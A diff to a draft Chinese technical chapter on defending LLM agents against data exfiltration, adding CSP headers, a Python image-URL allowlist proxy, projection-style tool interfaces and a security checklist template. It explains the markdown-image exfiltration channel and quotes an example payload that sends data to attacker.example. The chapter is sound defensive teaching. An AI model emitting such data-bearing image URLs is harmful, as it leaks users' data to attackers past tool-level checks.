@@ -59,7 +59,7 @@ status: drafting
 | 错误信息 | 报错里带上数据 | 出站内容脱敏（第 16 节） |
 | 日志 | 数据进了一个共享的日志系统 | 日志访问控制（第 16 节） |
 
-第三行值得单独说：**第 8 章实测过一个相关现象 —— 给模型一个 URL 图像，服务端会去下载它。** 那么反过来，如果模型能把数据编码进一个 URL，让渲染层去请求它，就是一个不走工具调用、不走 HTTP 工具的通道。**它绕过了你对"工具"的检查。**
+第三行值得单独说（**渲染层**：把 markdown 变成可见页面、并顺带加载图片的那一层，可能在浏览器里，也可能在服务端）。**第 8 章实测过一个相关现象 —— 给模型一个 URL 图像，服务端会去下载它。** 那么反过来，如果模型能把数据编码进一个 URL，让渲染层去请求它，就是一个不走工具调用、不走 HTTP 工具的通道。**它绕过了你对"工具"的检查。**
 
 这正是"通道要比工具清单更宽"的原因：**任何能让你的系统发起网络请求的地方，都是一个潜在通道** —— 包括图片加载、网页预览、webhook 回调。
 
@@ -184,6 +184,118 @@ if __name__ == "__main__":
     print("  关键结论：**三要素里，砍「触发」最难且最不可靠，砍另外两个都是确定性的。**")
     print("  所以外泄防护的重点不在「说服模型别外发」，而在「即使它想外发也没有路」。")
 ```
+
+## 拦住渲染层：CSP 加服务端 URL 白名单
+
+L57 说「渲染层也要拦」，但只说了「图片加载是浏览器发的请求」。拦法有两道，**两道都要**，因为它们的失效模式不同：
+
+**第一道：CSP（内容安全策略）。** 它是一个响应头，告诉浏览器「这个页面允许从哪些来源加载资源」。把它加上，模型生成的图片 URL 就无法把请求发到任意域名：
+
+```http
+Content-Security-Policy: default-src 'self'; img-src 'self' https://cdn.example.com; connect-src 'self'; script-src 'self'
+```
+
+- `img-src` 管 `<img src>` —— 模型在回答里写 `![](https://attacker.example/x?data=...)` 时，浏览器不会去加载它。
+- `connect-src` 管 `fetch` / `XMLHttpRequest` —— 防止前端代码被诱导去请求外部。
+- 它拦在**浏览器里**，所以对**服务端渲染**（SSR 时服务端自己去下载图片再内联）无效。
+
+**第二道：服务端 URL 白名单（图片走代理）。** 把 markdown 里的图片地址改写成你自己的代理端点，由代理做白名单校验 —— 判据与第 3 节那段网络代码完全一样：
+
+```python
+import ipaddress, socket
+from urllib.parse import urlparse, quote
+
+ALLOW_HOSTS = {"cdn.example.com"}
+CONNECT_TIMEOUT = 5
+
+def safe_image_url(url: str) -> str | None:
+    """通过校验的图片返回代理地址；否则返回 None（渲染成占位图）。"""
+    p = urlparse(url)
+    if p.scheme != "https":
+        return None
+    host = (p.hostname or "").lower()
+    if host not in ALLOW_HOSTS:                 # 白名单：只放行图片 CDN
+        return None
+    try:
+        ips = {i[4][0] for i in socket.getaddrinfo(host, None)}
+    except socket.gaierror:
+        return None
+    for ip in ips:                              # 二次拒绝：内网 / 元数据 / localhost
+        a = ipaddress.ip_address(ip)
+        if a.is_loopback or a.is_link_local or a.is_private:
+            return None
+    return "/img-proxy?u=" + quote(url, safe="")
+```
+
+**为什么 CSP 之外还要代理**：CSP 只能约束**浏览器**，而同一个 markdown 可能在服务端被渲染、被导出成 PDF、被别的 agent 再读一遍 —— 那些路径都不经过 CSP。代理把判据放在**数据出站的那一层**，任何渲染器都绕不过。反过来说，只做代理不做 CSP 也不够：代理可能被某条渲染路径跳过，两道一起才覆盖完整。
+
+**失败形态：** 只在渲染时做一次 URL 过滤、之后又原样把 markdown 存回数据库。下一次被别的组件读到（导出、预览、二次总结）时又变成一个可加载的外链 —— **数据只要进了 URL 就已经出去了**，过滤必须发生在**每一次用它发起请求之前**，而且要有「已过滤后仍被重新引入」的兜底（保存时就把不可信 URL 换成代理地址）。
+
+## 投影式接口：真实签名与返回
+
+L104-109 说「把读数据变成调接口」，具体签名就是这种形态 —— 关键是**返回形状由你的接口定义**：
+
+```python
+from decimal import Decimal
+
+# ❌ 原始数据：返回形状由数据源决定，你控制不了它带出什么
+def get_order(order_id: str) -> dict: ...
+
+# ✅ 投影一：只需要「有没有」，就只返回布尔
+def user_has_ordered(user_id: str, sku: str) -> bool:
+    ...
+
+# ✅ 投影二：只需要总量，就只返回聚合值
+def monthly_sales_total(month: str) -> Decimal:
+    ...
+
+# ✅ 投影三：只需要相关段落，就返回检索片段而不是整篇
+def refund_passages(doc_id: str, query: str, top_k: int = 3) -> list[dict]:
+    """返回 [{"text": "...", "span": [120, 210], "score": 0.83}]"""
+    ...
+```
+
+返回示例（示例：构造数据，未实跑）：
+
+```json
+{
+  "tool": "refund_passages",
+  "result": [
+    {"text": "退款需在签收后 7 日内发起，超期不予受理。", "span": [120, 210], "score": 0.83}
+  ]
+}
+```
+
+**判据：** 问一句「模型要做的判断，需要原始记录吗？」。只做布尔/聚合/片段判断的任务，把它需要的那个投影做成接口 —— 模型看不见的东西，注入也拿不走。这和「让代码算而不是让模型算」是同一个思路：**返回形状能由你确定的，就不要交给数据源确定。**
+
+## 三问清单的数据模板
+
+L86-92 那三个问题，光问一遍记不住。给一份可以逐项填的结构（示例：构造数据，未实跑），字段就是「你能据此写防护」的最小集合：
+
+```json
+{
+  "agent": "refund-assistant",
+  "access": {
+    "most_sensitive_data": "客户表（手机号、余额）",
+    "fields_visible_to_agent": ["order_id", "amount", "currency"],
+    "returns_projection": true,
+    "read_tools": ["refund_passages", "order_status"]
+  },
+  "channels": {
+    "tool_outbound": ["https://api.example.com"],
+    "render_layer": {"img_src_allow": ["cdn.example.com"], "csp": true},
+    "callbacks": [],
+    "log_sinks": ["stdout->observability.example.com"]
+  },
+  "trigger_controls": {
+    "input_tagging": true,
+    "quarantine_rules": ["imperative+toolname", "url_pattern"],
+    "note": "只降低概率，不作为防线"
+  }
+}
+```
+
+**怎么用这份模板：** 每个字段填不出来，就对应一个缺口 —— `channels.render_layer` 填不出，说明你没检查过图片预览；`access.fields_visible_to_agent` 与 `most_sensitive_data` 对不上，说明投影没做到位。它和第 5 节那张四层表是同一类工具：**把「我们考虑了安全」逼成一张填得满或填不满的表。**
 
 ## 常见坑
 
